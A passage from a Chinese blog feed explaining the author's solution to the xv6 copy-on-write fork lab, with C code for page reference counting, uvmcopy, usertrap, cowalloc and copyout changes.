class="headerlink" title="解决办法"></a>解决办法</h3><p>Copy-on-write (COW) fork() 的目标是推迟分配和复制物理内存页，直到实际需要副本（如果有）。<br>COW fork() 只为子进程创建一个页表，用户内存的 PTE 指向父进程的物理页。 COW fork() 将父级和子级中的所有用户 PTE 标记为只读。 当任一进程尝试写入其中一个 COW 页时，CPU 将强制发生页错误。 内核页面错误处理程序检测到这种情况，为错误进程分配物理内存页面，将原始页面复制到新页面，并修改错误进程中的相关 PTE 以引用新页面，这次使用 PTE 标记为可写。 当页面错误处理程序返回时，用户进程将能够写入其页面副本。</p><p>COW fork() 使得释放实现用户内存的物理页变得有点棘手。 给定的物理页可能被多个进程的页表引用，并且仅当最后一个引用消失时才应释放。 在像 xv6 这样的简单内核中，这种簿记相当简单，但在生产内核中，这可能很难正确执行； 例如，参见修补直到奶牛回家。</p><h3 id="Implement-copy-on-write-fork"><a href="#Implement-copy-on-write-fork" class="headerlink" title="Implement copy-on-write fork"></a>Implement copy-on-write fork</h3><blockquote><p>Your task is to implement copy-on-write fork in the xv6 kernel. You are done if your modified kernel executes both the cowtest and ‘usertests -q’ programs successfully.</p></blockquote><p>为了帮助你测试你的实现，我们提供了一个名为<code>cowtest</code>的xv6程序（源代码在<code>user/cowtest.c</code>中）。<code>cowtest</code>运行各种测试，但即使是第一个测试也会在未修改的xv6上失败。因此，最初你会看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cowtest</span><br><span class="line">simple: fork() failed</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>“simple”测试分配了超过可用物理内存一半的空间，然后执行<code>fork()</code>。<code>fork</code>失败是因为没有足够的空闲物理内存给子进程完整复制父进程的内存。</p><p>当你完成后，你的内核应该通过<code>cowtest</code>和<code>usertests -q</code>中的所有测试。也就是说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cowtest</span><br><span class="line">simple: ok</span><br><span class="line">simple: ok</span><br><span class="line">three: zombie!</span><br><span class="line">ok</span><br><span class="line">three: zombie!</span><br><span class="line">ok</span><br><span class="line">three: zombie!</span><br><span class="line">ok</span><br><span class="line">file: ok</span><br><span class="line">ALL COW TESTS PASSED</span><br><span class="line">$ usertests -q</span><br><span class="line">...</span><br><span class="line">ALL TESTS PASSED</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>这表明，完成后的内核应该能够处理写时复制（COW，Copy-On-Write）机制下的内存管理，使得即使在物理内存紧张的情况下也能成功执行<code>fork()</code>，并且通过所有相关的功能和性能测试。</p><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><ol><li>修改<code>uvmcopy()</code>将父进程的物理页映射到子进程中，而不是分配新的页。将子进程和父进程所有设置PTE_W的PTE修改为PTE_R</li><li>修改<code>usertrap()</code>检测页面错误。当一个向写入页面错误在COW页上发生时，用<code>kalloc()</code>分配一个新的页面并设置PTE_W。最初只读的页面（未映射 PTE_W，如文本段中的页面）应保持只读状态并在父子之间共享； 尝试写入此类页面的进程应该被终止。</li><li>确保每个物理页在最后一个 PTE 引用消失时被释放——但不是在此之前。 实现此目的的一个好方法是为每个物理页保留引用该页的用户页表数量的“引用计数”。当 <code>kalloc()</code> 分配页面时，将页面的引用计数设置为 1。 当 <code>fork</code> 导致子进程共享页面时增加页面的引用计数，并在每次任何进程从其页表中删除页面时减少页面的计数。 <code>kfree()</code> 仅当其引用计数为零时才应将页面放回到空闲列表中。 将这些计数保存在固定大小的整数数组中是可以的。 您必须制定一个如何索引数组以及如何选择其大小的方案。 例如，您可以使用页面的物理地址除以 4096 来索引数组，并为数组提供与 <code>kalloc.c</code> 中的 <code>kinit()</code> 放置在空闲列表上的任何页面的最高物理地址相同的元素数。 请随意修改 <code>kalloc.c</code>（例如 <code>kalloc()</code> 和 <code>kfree()</code>）以维护引用计数。</li><li>修改 <code>copyout()</code> 以在遇到 <code>COW</code> 页面时使用与页面错误相同的方案。</li></ol><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ul><li>It may be useful to have a way to record, for each PTE, whether it is a COW mapping. You can use the RSW (reserved for software) bits in the RISC-V PTE for this.</li><li><code>usertests -q</code> explores scenarios that <code>cowtest</code> does not test, so don’t forget to check that all tests pass for both.</li><li>Some helpful macros and definitions for page table flags are at the end of <code>kernel/riscv.h</code>.</li><li>If a COW page fault occurs and there’s no free memory, the process should be killed.</li></ul><h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><p>为了对每一个<strong>物理页面</strong>进行映射计数，我们首先在kalloc.c中设置一个对所有<strong>物理页面</strong>计数的全局数组，对该数组的操作需要互斥，我们用一个锁解决。</p><p><img src="/../images/Lab-Copy-on-Write-Fork-for-xv6/%E6%88%AA%E5%B1%8F2024-03-12%2014.31.22.png" alt="截屏2024-03-12 14.31.22"></p><p>从xv6的内核物理地址空间图可以看到，从PHYSTOP到KERNBASE的虚拟地址空间映射带的是物理地址用于RAM的空间，所以我们可以直接计算出最大页面的大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">ref_lock</span>;</span> <span class="comment">// 锁</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXPAGES (PHYSTOP - KERNBASE) / PGSIZE</span></span><br><span class="line"><span class="type">int</span> ref_count[MAXPAGES]; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">index_ref</span><span class="params">(uint64 pa)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (pa - KERNBASE) / PGSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">incr_ref</span><span class="params">(uint64 pa)</span> &#123;</span><br><span class="line">    acquire(&amp;kmem.ref_lock);</span><br><span class="line">    ref_count[index_ref(pa)]++;</span><br><span class="line">    release(&amp;kmem.ref_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decr_ref</span><span class="params">(uint64 pa)</span> &#123;</span><br><span class="line">    acquire(&amp;kmem.ref_lock);</span><br><span class="line">    ref_count[index_ref(pa)]--;</span><br><span class="line">    release(&amp;kmem.ref_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_ref</span><span class="params">(uint64 pa, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    acquire(&amp;kmem.ref_lock);</span><br><span class="line">    ref_count[index_ref(pa)] = n;</span><br><span class="line">    release(&amp;kmem.ref_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_ref</span><span class="params">(uint64 pa)</span> &#123;</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    acquire(&amp;kmem.ref_lock);</span><br><span class="line">    res = ref_count[index_ref(pa)];</span><br><span class="line">    release(&amp;kmem.ref_lock);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着我们在<code>kinit()</code>函数中初始化锁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kinit</span><span class="params">()</span> &#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem.ref_lock, <span class="string">&quot;reflock&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="type">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>kalloc()</code>一个页面的时候，我们将页面对应的映射计数初始化为1，当<code>kfree()</code>一个物理地址对应的页面时，我们减少页面对应的映射计数，当且仅当页面计数为0时，才真正的释放掉这个内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">kfree(<span class="type">void</span> *pa) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查pa的值是否合法</span></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pa 对应的索引减 1</span></span><br><span class="line">  decr_ref((uint64)pa);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 只有 pa 的计数为 0 时，才能把该页释放掉</span></span><br><span class="line">  <span class="keyword">if</span>(get_ref((uint64)pa) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r-&gt;next = kmem.freelist;</span><br><span class="line">  kmem.freelist = r;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化时置计数位1</span></span><br><span class="line">  <span class="keyword">if</span>(r) &#123;</span><br><span class="line">      set_ref((uint64)r, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，我们在<code>kinit()</code>的时候调用了<code>freerange()</code>，同时又在<code>freerange()</code>函数中调用了<code>kfree()</code>函数，所以我们需要在<code>freerange()</code>中将计数数组初始化为1，放置计数变为负数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">freerange</span><span class="params">(<span class="type">void</span> *pa_start, <span class="type">void</span> *pa_end)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  p = (<span class="type">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line"><span class="comment">// 初始化计数数组</span></span><br><span class="line">  acquire(&amp;kmem.ref_lock);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAXPAGES; ++i) &#123;</span><br><span class="line">    ref_count[i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.ref_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="type">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们在<code>defs.h</code>中注册这些函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">index_ref</span><span class="params">(uint64 pa)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">incr_ref</span><span class="params">(uint64 pa)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decr_ref</span><span class="params">(uint64 pa)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">set_ref</span><span class="params">(uint64 pa, <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get_ref</span><span class="params">(uint64 pa)</span>;</span><br></pre></td></tr></table></figure><p>接着我们修改<code>uvmcopy()</code>函数，将子进程的page table中的page table entry 直接映射到父进程的page中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果父进程的页表页是可写的，我们不允许它可写</span></span><br><span class="line">    <span class="comment">// 并且 PTE_COW 位 = 1</span></span><br><span class="line">    <span class="comment">// 如果父进程的页表本身就是不可写的，那就不需要修改PTE 的 flag</span></span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_W) &#123;</span><br><span class="line">        *pte |= PTE_COW;</span><br><span class="line">        *pte &amp;= ~PTE_W;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mappages(new, i, PGSIZE, (uint64)pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    incr_ref((uint64)pa); <span class="comment">// 增加物理页面的映射计数</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>usertrap()</code>函数处理load page fault：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usertrap</span><span class="params">()</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r_scause() == <span class="number">15</span>) &#123; <span class="comment">// load page fault</span></span><br><span class="line">    <span class="comment">// 使用 cowalloc 函数分配一个新的页</span></span><br><span class="line">        <span class="keyword">if</span>(cowalloc(p-&gt;pagetable, r_stval()) != <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): cowalloc failed\n&quot;</span>);</span><br><span class="line">          setkilled(p);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    setkilled(p);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cowalloc()</code>函数的实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cowalloc</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (va &gt;= MAXVA) &#123; <span class="comment">// 判断虚拟地址是否越界</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va cannot be greater than MAXVA: %p\n&quot;</span>, va);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    va = PGROUNDDOWN(va);</span><br><span class="line">    <span class="comment">// 拿到 va 对应的 pte</span></span><br><span class="line">    <span class="type">pte_t</span> *pte = walk(pagetable, va, <span class="number">0</span>);</span><br><span class="line">    uint64 pa = PTE2PA(*pte); <span class="comment">// 拿到虚拟地址对应的物理地址</span></span><br><span class="line">    <span class="comment">// 抽取 pte flags</span></span><br><span class="line">    uint64 flags = PTE_FLAGS(*pte);</span><br><span class="line">    <span class="keyword">if</span> (!(*pte &amp; PTE_COW))&#123; <span class="comment">// check if page is COW page</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not a COW page. Invalid va: %p\n&quot;</span>, va);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 分配一个新的页</span></span><br><span class="line">    <span class="type">void</span> *mem = kalloc();</span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cowalloc: alloc mem runs out of memory\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把原始页的内容拷贝到 mem 中</span></span><br><span class="line">    memmove(mem, (<span class="type">void</span>*)pa, PGSIZE);</span><br><span class="line">    <span class="comment">// 置 PTE_COW 为 0，PTE_W 为 1</span></span><br><span class="line">    flags |= PTE_W;   <span class="comment">// 0 | 1 = 1</span></span><br><span class="line">    flags ^= PTE_COW; <span class="comment">// 1 ^ 1 = 0</span></span><br><span class="line">    <span class="comment">// 对原先页取消映射并释放页</span></span><br><span class="line">    uvmunmap(pagetable, va, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 映射当前mem</span></span><br><span class="line">    <span class="keyword">if</span> (mappages(pagetable, va, PGSIZE, (uint64) mem, flags) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cowalloc: mappages failed\n&quot;</span>);</span><br><span class="line">        kfree((<span class="type">void</span>*)mem);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们要修改<code>copyout</code>函数，这是因为当我们将内核空间的数据拷贝到用户空间时，目标地址可能为子进程的空间，这片空间在<code>uvmcopy</code>的时候被置为unwriteable，所以我们要为其分配一个新的page。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">copyout</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 dstva, <span class="type">char</span> *src, uint64 len)</span> &#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva); <span class="comment">// 拿到对应的page address</span></span><br><span class="line">    <span class="keyword">if</span>(va0 &gt;= MAXVA) &#123; <span class="comment">// 判断是否越界</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;copyout: va0 cannot be greater than MAXVA\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">pte_t</span> *pte = walk(pagetable, va0, <span class="number">0</span>); <span class="comment">// 拿到 pte</span></span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;copyout: pte cannot be 0\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 判断pte映射到的page是否合法</span></span><br><span class="line">    <span class="keyword">if</span> ((*pte &amp; PTE_V) == <span class="number">0</span> || (*pte &amp; PTE_U) == <span class="number">0</span> ||</span><br><span class="line">        ((*pte &amp; PTE_W) == <span class="number">0</span> &amp;&amp; (*pte &amp; PTE_COW) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>((*pte &amp; PTE_W) == <span class="number">0</span> &amp;&amp; (*pte &amp; PTE_COW) != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 只有当 PTE_W == 0 且 PTE_COW == 1时，才能cowalloc</span></span><br><span class="line">      <span class="keyword">if</span>(cowalloc(pagetable, va0) != <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;copyout cowalloc failed\n&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;copyout: pa0 cannot be 0\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="type">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得在<code>defs.h</code>中注册新加的函数<code>cowalloc()</code></p><p>测试结果：</p><p><img src="/../images/Lab-Copy-on-Write-Fork-for-xv6/%E6%88%AA%E5%B1%8F2024-03-12%2014.57.58.png" alt="截屏2024-03-12 14.57.58"></p><p>没有time.txt。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lab-Copy-on-Write-Fork-for-xv6&quot;&gt;&lt;a href=&quot;#Lab-Copy-on-Write-Fork-for-xv6&quot; class=&quot;headerlink&quot; title=&quot;Lab: Copy-on-Write Fork for xv6&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.5840 Lab 1: MapReduce</title>
    <link href="http://example.com/2024/03/06/6-5840-Lab-1-MapReduce/"/>
